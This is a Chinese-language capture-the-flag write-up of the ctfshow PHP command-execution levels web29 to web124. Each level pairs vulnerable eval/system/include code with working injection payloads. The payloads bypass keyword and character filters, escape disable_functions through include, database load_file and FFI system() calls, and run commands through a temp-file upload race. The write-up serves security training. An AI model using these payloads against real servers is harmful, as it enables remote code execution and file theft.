---
title: ctfshow web入门(命令执行)
categories: ctfshow
---
## web29
```bash
<?php
error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag/i", $c)){
        eval($c);
    }
    
}else{
    highlight_file(__FILE__);
}
```
payload:
```
  ?c=system("cat fl``ag.php");
  ?c=system("cat fla*.php");
  ?c=echo `nl fl''ag.php`;
```
cat 可替换为 `tac, more, less, curl, nl, tail, sort, strings`

<!--more-->
---
## web30
payload:
```
 ?c=echo`nl fl*`;
```
---
## web31


```bash
<?php
error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag|system|php|cat|sort|shell|\.| |\'/i", $c)){
        eval($c);
    }
    
}else{
    highlight_file(__FILE__);
}
```
payload:
```
1. ?c=eval($_GET[1]);&1=system("cat flag.php");
2. ?c=echo`nl%09fl*`;
```
此题通过get先传一个参数1，在后面执行cat flag.php的命令是不会被过滤的

---
## web32-36

```bash
<?php
error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(/i", $c)){
        eval($c);
    }
    
}else{
    highlight_file(__FILE__);
}
```
过滤空格 和 ;
用?>代替 `;`

payload:
```
1. ?c=include$_GET[0]?>&0=data://text/plain,<?php echo(`cat flag.php`);?>
2. ?c=include$_GET[0]?>&0=php://filter/read=convert.base64-encode/resource=flag.php
```
---
## web37-38

```bash
<?php
//flag in flag.php
error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag/i", $c)){
        include($c);
        echo $flag;
    
    }
        
}else{
    highlight_file(__FILE__);
}
```
payload:
```
1.?c=data:text//plain,<?=system("nl fl*");?>
2.?c=data://text/plain;base64,PD9waHAgc3lzdGVtKCJjYXQgZmxhZy5waHAiKTs/Pg==
```
---
## web39

```bash
<?php
//flag in flag.php
error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag/i", $c)){
        include($c.".php");
    }
        
}else{
    highlight_file(__FILE__);
}
```
?c=php://filter/read=convert.base64-encode/resource=fl*(姿势不对)  

还是用data  
?>.php不影响前面已经闭合的php语句

payload:
```
?c=data://text/plain,<?php system("cat f*");?>
```
---
## web40

```bash
<?php
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/[0-9]|\~|\`|\@|\#|\\$|\%|\^|\&|\*|\（|\）|\-|\=|\+|\{|\[|\]|\}|\:|\'|\"|\,|\<|\.|\>|\/|\?|\\\\/i", $c)){
        eval($c);
    }
        
}else{
    highlight_file(__FILE__);
}
```
过滤的是中文括号，用到以下包含英文括号的函数：
```
localeconv()：返回一包含本地数字及货币格式信息的数组。其中数组中的第一个为点号(.)

pos()：返回数组中当前元素的值

scandir()：获取目录下的文件

array_reverse()：将数组逆序排列

next()：函数将内部指针指向下一元素，并输出
```
payload:
先查看目录下的文件名：
```
 ?c=print_r(scandir(pos(localeconv())));
```

![](https://img-blog.csdnimg.cn/20210213210611388.png#pic_center)
接着用array_reverse()和next()，使指针指向flag.php，并用highlight_file()输出，得到flag。
```
?c=highlight_file(next(array_reverse(scandir(pos(localeconv())))));
```
highlight_file或show_source

## web 41

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: 羽
# @Date:   2020-09-05 20:31:22
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-05 22:40:07
# @email: 1341963450@qq.com
# @link: https://ctf.show

*/

if(isset($_POST['c'])){
    $c = $_POST['c'];
if(!preg_match('/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\{|\}|\&|\-/i', $c)){
        eval("echo($c);");
    }
}else{
    highlight_file(__FILE__);
}
?>
```

利用 `|`

exp

```php
import re
content = ''
preg = '/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\{|\}|\&|\-/'
for i in range(256):
    for j in range(256):
        if not (re.match(preg,chr(i),re.I) or re.match(preg,chr(j),re.I)):
            k = i | j
            if k>=32 and k<=126:
                a = '%' + hex(i)[2:].zfill(2)
                b = '%' + hex(j)[2:].zfill(2)
                content += (chr(k) + ' '+ a + ' ' + b + '\n')
f = open('rce_or.txt', 'w')
f.write(content)
```

生成

```
a %60 %01
b %60 %02
c %60 %03
d %60 %04
e %60 %05
f %60 %06
g %60 %07
h %60 %08
i %60 %09
j %60 %0a
k %60 %0b
l %60 %0c
m %60 %0d
n %60 %0e
o %60 %0f
p %60 %10
q %60 %11
r %60 %12
s %60 %13
t %60 %14
u %60 %15
v %60 %16
w %60 %17
x %60 %18
y %60 %19
z %60 %1a
{ %60 %1b
| %60 %1c
} %60 %1d
~ %60 %1e
` %60 %20
```

构造

```
c="");('%60%60%60%60%60%60'|'%13%19%13%14%05%0d')(('%03%01%14'|'%60%60%60').' *');#
# system('cat *')
eval(echo "");system('cat *');#;);
```

BP发包

## web42

```bash
<?php
if(isset($_GET['c'])){
    $c=$_GET['c'];
    system($c." >/dev/null 2>&1");
}else{
    highlight_file(__FILE__);
}
```
此题代码的system()中有" >/dev/null 2>&1"，他的作用是将程序的标准输出和错误输出都存到/dev/null（舍弃掉）。

payload:
```
?c=ls;

?c=cat flag.php;
cat flag.php%0a
cat flag.php||
cat flag.php%26
cat flag.php%26%26
```

---
## web43-44-45-46
过滤了cat用tac，过滤了;用%0a或 ||。

过滤了flag
```
?c=tac fl*%0a
?c=tac fl??????%0a（？与省略的ag.php数量一致）
?c=tac fl``ag.php||
```

过滤空格
```
?c=tac%09fla*%0a

?c=tac$IFS$9fl'ag'.php||

?c=tac<fl'ag'.php||

?c=tac${IFS}fl'ag'.php||

?c=tac<>fl'ag'.php||
```

过滤数字

%0a是换行符，能代替分号

虽然这题过滤了数字，但因为%09是一个字符，属于编码，在带入服务器时会进行解码，所以并没有被过滤



---
## web47-49
payload:
```
?c=tac%09fl'ag'.php%0a
```

---
## web50-51
![](https://img-blog.csdnimg.cn/20210213214411265.png#pic_center)
payload:
```
?c=tac<fla'g'.php%0a
```
---
## web52
这题过滤了<>，那么就用${IFS}代替空格，但是，没有flag.php
```
?c=ls${IFS}../../../||  查看有flag
?c=nl${IFS}/fl''ag%0a
```
---
## web53
payload:
```
?c=nl${IFS}fla''g.php%0a
```
---
## web54
![](https://img-blog.csdnimg.cn/2021021321474718.png#pic_center)
过滤了好多好多

>bin为binary的简写主要放置一些 系统的必备执行档例如:cat、cp、chmod df、dmesg、gzip、kill、ls、mkdir、more、mount、rm、su、tar、base64等

payload:
```
?c=/bin/?at${IFS}f???????%0a

?c=paste${IFS}fl?g.php%0a

?c=uniq${IFS}f???????
```
---
## web55(*)

```bash
<?php
// 你们在炫技吗？
if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|[a-z]|\`|\%|\x09|\x26|\>|\</i", $c)){
        system($c);
    }
}else{
    highlight_file(__FILE__);
}
```
字母都过滤了

法一与法二都带有数字，法三不带有数字

**法一**：
利用/bin/base64 flag.php%0a 将指定的文件的内容以base64加密的形式输出
```
?c=/???/????64 ????????%0a
```
---
**法二**：
姿势一有些类似，不过利用的是/usr/bin目录:
主要放置一些应用软件工具的必备执行档主要：diff、zip、last、less、make、passwd、bzip2例如c++、g++、gcc、chdrv、diff、dig、du、eject、elm、free、gnome、 zip、htpasswd、kfm、ktop、last、less、locale、m4、make、man、mcopy、ncftp、 newaliases、nslookup passwd、quota、smb、wget等。

大师傅们利用的是/usr/bin下的bzip2：
```
?c=/???/???/????2 ????????
?c=/usr/bin/bzip2 flag.php
```
把flag.php压缩，然后访问url+flag.php.bz2就可以把压缩后的flag.php给下载下来

---

**法三**：

[无数字字母webshell](https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html)

>看了之后才发现，我们可以通过`post一个文件`(文件里面的sh命令)，在上传的过程中，通过`.(点)`去执行执行这个文件。(形成了条件竞争)。一般来说这个文件在linux下面保存在/tmp/php`??????`一般后面的6个字符是随机生成的有大小写。（可以通过linux的匹配符去匹配）
注意：通过.去执行sh命令不需要有执行权限

在这个之前我们需要构造一个post上传文件的数据包
抓包
构造 `?c=.+/???/????????[@-[]`  并添加命令

注：后面的[@-[]是linux下面的匹配符，是进行匹配的大写字母。

![](https://img-blog.csdnimg.cn/20210213220752181.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
![](https://img-blog.csdnimg.cn/20210213220759215.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)

----

## web57(*)

```bash
<?php
// 还能炫的动吗？
//flag in 36.php
if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|[a-z]|[0-9]|\`|\|\#|\'|\"|\`|\%|\x09|\x26|\x0a|\>|\<|\.|\,|\?|\*|\-|\=|\[/i", $c)){
        system("cat ".$c.".php");
    }
}else{
    highlight_file(__FILE__);
}
```
字母 数字过滤  .过滤 上面方法不能用了
所以我们只需要凑成36即可

```bash
$(())
```
可以在 (( )) 前面加上`$`符号获取 (( )) 命令的执行结果，也即获取整个表达式的值。以 c=`$`((a+b)) 为例，即将 a+b 这个表达式的运算结果赋值给变量 c。
注意，类似 c=((a+b)) 这样的写法是错误的，不加$就不能取得表达式的结果。

echo $(())会返回0

取反：
如果b=~a，那么a+b=-1
echo `$(())`会返回0

`$((~$(())))`的结果是-1

`$((  $((~$(())))  $((~$(())))  ))`的结果是-2，相当于-1-1

所以将他们放一起就默认是相加，那么只需要放37个`$((~$(())))`就能得到-37的结果，再对它进行取反，最终得到36

![](https://img-blog.csdnimg.cn/20210213221632133.png#pic_center)

---
## web58-65

```bash
<?php
// 你们在炫技吗？
if(isset($_POST['c'])){
        $c= $_POST['c'];
        eval($c);
}else{
    highlight_file(__FILE__);
}
```

接下来开始绕disable_functions了。
读文件的函数有这些：
```
 1.file_get_contents()

 2.highlight_file()

 3.show_source()

 4.fgets()

 5.file()

 6.readfile()
```

1.
![](https://img-blog.csdnimg.cn/20210213221831601.png#pic_center)
2.
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210213221845653.png#pic_center)
3.![](https://img-blog.csdnimg.cn/20210213222015742.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
4.![](https://img-blog.csdnimg.cn/20210213222026976.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
5.
![](https://img-blog.csdnimg.cn/20210213222037403.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
6.
![](https://img-blog.csdnimg.cn/20210213222046601.png#pic_center)
payload:
```
c=show_source('flag.php');
```

---
## web60
```
  //通过复制，重命名读取php文件内容（函数执行后，访问url/flag.txt）
       copy()
       rename()
  //用法：
       copy("flag.php","flag.txt");            
       rename("flag.php","flag.txt");  
```
---
## web66-70
”/“是根目录，”~“是家目录。

```bash
<?php
// 你们在炫技吗？
if(isset($_POST['c'])){
        $c= $_POST['c'];
        eval($c);
}else{
    highlight_file(__FILE__);
}
```
![](https://img-blog.csdnimg.cn/20210213222721977.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
扫描根目录`scandir`

![](https://img-blog.csdnimg.cn/20210213222748764.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
显示根目录下的flag.txt
```
1.过滤了print_r()函数，可以使用var_dump()函数代替

2.过滤了var_dump()函数，可以使用var_export()函数

3.过滤了highlight_file()函数，可以尝试文件包含include

4.除了scandir还有 (web73)

c=
$a=glob("/*");
foreach($a as $value){
echo $value."   ";
}

c=
$a=new DirectoryIterator('glob:///*');
foreach($a as $f){
echo($f->__toString()." ");
}

5.include可以包含文件，如txt文本格式，并把包含的文件当作php代码解析执行
```
![](https://img-blog.csdnimg.cn/20210213223151958.png#pic_center)
payload:
```
c=var_export(scandir('/'));
c=include('/flag.txt');
```
---
## web71

```bash
<?php
error_reporting(0);
ini_set('display_errors', 0);
// 你们在炫技吗？
if(isset($_POST['c'])){
        $c= $_POST['c'];
        eval($c);
        $s = ob_get_contents();
        ob_end_clean();
        echo preg_replace("/[0-9]|[a-z]/i","?",$s);
}else{
    highlight_file(__FILE__);
}
?>
你要上天吗？
```
要在eval 处结束 否则会被替换为 ？

那么可以用`exit()/die()`提前结束，这样就不会将字符替换为问号

payload：
```
c=var_export(scandir('/'));exit();
c=include("/flag.txt");die();
```
---
## web73-74
ban了scandir用glob 利用数组遍历的方法输出根目录下的所有文件
```
c=
$a=new DirectoryIterator('glob:///*');  //php使用glob遍历文件夹
foreach($a as $f){
echo($f->__toString()." ");
}
```
---
## web75-76
这题连include()都用不了，还是看师傅的博客，才知道要用sql语句来读取数据库文件

payload:
```
c=?><?php 
	$a=new DirectoryIterator("glob:///*");
	foreach($a as $f){
	echo($f -> __toString().'  ');
	}
	exit();
?>
//web75 flag在 /flag36.txt；web76 flag在 /flag36d.txt

c=
try {
    $dbh = new PDO('mysql:host=localhost;dbname=ctftraining', 'root',
        'root');

    foreach ($dbh->query('select load_file("/flag36.txt")') as $row) {
        echo ($row[0]) . "|";
    }
    $dbh = null;
} catch (PDOException $e) {
    echo $e->getMessage();
    exit(0);
}
exit(0);
//我看不太懂，只能先抄个答案了
```

---
## web77
>FFI（Foreign Function Interface），即外部函数接口，是指在一种语言里调用另一种语言代码的技术。PHP的FFI扩展就是一个让你在PHP里调用C代码的技术。

通过FFI，可以实现调用system函数，从而将flag直接写入一个新建的文本文件中，然后访问这个文本文件，获得flag

payload:
```
//首先是熟悉的确定flag位置和名称
c=?><?php 
	$a=new DirectoryIterator("glob:///*"); 
	foreach($a as $f) 
	{ 
		echo($f->__toString().'  ');
	} 
	exit();
?>
//FFI调用system函数
c=
$ffi=FFI :: cdef("int system(const char *command);");
$a='/readflag > 1.txt';
$ffi->system($a);
exit();

再访问1.txt
```

---
## web118(*)
可以用Linux中内置的bash变量来做，具体知识可以参考：[常见Bash内置变量介绍](https://www.cnblogs.com/sparkdev/p/9934595.html#title_0)（可以去Linux命令行里自己实际操作下，加深理解）

```
root@baba:~# echo ${PWD}
/root
root@baba:~# echo ${PWD:1:1}   //表示从第2（1+1）个字符开始的一个字符
r
root@baba:~# echo ${PWD:0:1}   //表示从第1（0+1）个字符开始的一个字符
/
root@baba:~# echo ${PWD:~0:1}  //表示从最后一个字符开始的一个字符
t
root@baba:~# echo ${PWD:~A}    //字母代表0
t
```

发现网站报错的路径是/var/www/html，那么`${PWD:~A}`的结果就应该是’ l ‘，因为`${PATH}`通常是bin所以`${PATH:~A}`的结果是’ n '，那么他们拼接在一起正好是nl，能够读取flag，因为通配符没有被过滤，所以可以用通配符代替flag.php

payload：
```
 code=${PATH:~A}${PWD:~A} ????.???
```
---
## web119
可以构造出/bin/base64 flag.php，只需要`/和4`两个字符就行，其他的可以用通配符代替。

/很简单，pwd的第一位就是，因为这题ban了数字，所以可以用该题值必是1的`${#SHLVL}`绕过：

>SHLVL 是记录多个 Bash 进程实例嵌套深度的累加器,进程第一次打开shell时`${SHLVL}=1`，然后在此shell中再打开一个shell时${SHLVL}=2。

还有一个4的问题，可以用`${#RANDOM}`，在Linux中，`${#xxx}`显示的是这个值的位数，例如12345的值是5，而random函数绝大部分产生的数字都是4位或者5位的，因此可以代替4.
```
root@baba:~# echo ${#RANDOM}
4
root@baba:~# echo ${#RANDOM}
4
root@baba:~# echo ${#RANDOM}
5
root@baba:~# echo ${#RANDOM}
3
root@baba:~# echo ${#RANDOM}
5
root@baba:~# echo ${#RANDOM}
4
```
payload:
```
code=${PWD::${#SHLVL}}???${PWD::${#SHLVL}}?????${#RANDOM} ????.???
```

---
## web120
hint:
```
${PWD::${#SHLVL}}???${PWD::${#SHLVL}}?${USER:~A}? ????.???
```
`${USER}`显示当前用户名

---
## web121
这题最关键的SHLVL被过滤了，可以用`${#?}`代替
```
$?
用途：上一条命令执行结束后的传回值。通常0代表执行成功，非0代表执行有误
```
由于上一条命令是成功执行的，所以返回0，长度是1，能完美代替`${#SHLVL}`。其他地方没有变化

payload：
```
code=<A;${HOME::$?}???${HOME::$?}?????${RANDOM::$?} ????.???
```

---
## web124(*)

```bash
<?php
error_reporting(0);
//听说你很喜欢数学，不知道你是否爱它胜过爱flag
if(!isset($_GET['c'])){
    show_source(__FILE__);
}else{
    //例子 c=20-1
    $content = $_GET['c'];
    if (strlen($content) >= 80) {
        die("太长了不会算");
    }
    $blacklist = [' ', '\t', '\r', '\n','\'', '"', '`', '\[', '\]'];
    foreach ($blacklist as $blackitem) {
        if (preg_match('/' . $blackitem . '/m', $content)) {
            die("请不要输入奇奇怪怪的字符");
        }
    }
    //常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp
    $whitelist = ['abs', 'acos', 'acosh', 'asin', 'asinh', 'atan2', 'atan', 'atanh', 'base_convert', 'bindec', 'ceil', 'cos', 'cosh', 'decbin', 'dechex', 'decoct', 'deg2rad', 'exp', 'expm1', 'floor', 'fmod', 'getrandmax', 'hexdec', 'hypot', 'is_finite', 'is_infinite', 'is_nan', 'lcg_value', 'log10', 'log1p', 'log', 'max', 'min', 'mt_getrandmax', 'mt_rand', 'mt_srand', 'octdec', 'pi', 'pow', 'rad2deg', 'rand', 'round', 'sin', 'sinh', 'sqrt', 'srand', 'tan', 'tanh'];
    preg_match_all('/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/', $content, $used_funcs);  
    foreach ($used_funcs[0] as $func) {
        if (!in_array($func, $whitelist)) {
            die("请不要输入奇奇怪怪的函数");
        }
    }
    //帮你算出答案
    eval('echo '.$content.';');
}

```
这题只能用他给的函数，且限制了传入的值的长度为80，那么可以传入一个get参数，然后再传入想用的payload，需要编码绕过，首先，注意白名单中的一些函数：

>base_convert(number,frombase,tobase)：在任意进制之间转换数字
dechex()：把十进制数转换为十六进制数
hex2bin()：把十六进制值的字符串转换为 ASCII 字符

先用无绕过的方式写出payload：
```
  ?c=$_GET[a]($_GET[b]);&a=system&b=("cat flag.php")
```
由于`[]`被ban了，可以用`{}`代替。
因为hex2bin函数被ban，要想使用它，必须要构造出他的其他进制形式，然后转换成hex2bin函数，那么base_convert()函数就发挥作用了，可以构造:
```
$pi=base_convert(37907361743,10,36)，这里$pi就是hex2bin函数
```
则payload前半部分绕过_GET的就能出来了：

```bash
?c=$pi=base_convert(37907361743,10,36)(dechex(1598506324));($$pi){pi}(($$pi){abs})&pi=system&abs=cat /flag
// base_convert(37907361743,10,36) -> hex2bin
// dechex(1598506324) -> 5f474554
// hex2bin("5f474554") -> _GET

$pi 的值为 hex2bin("5f474554") ，$$pi 也就是 $hex2bin("5f474554") -> $_GET ，变成了预定义变量。
```
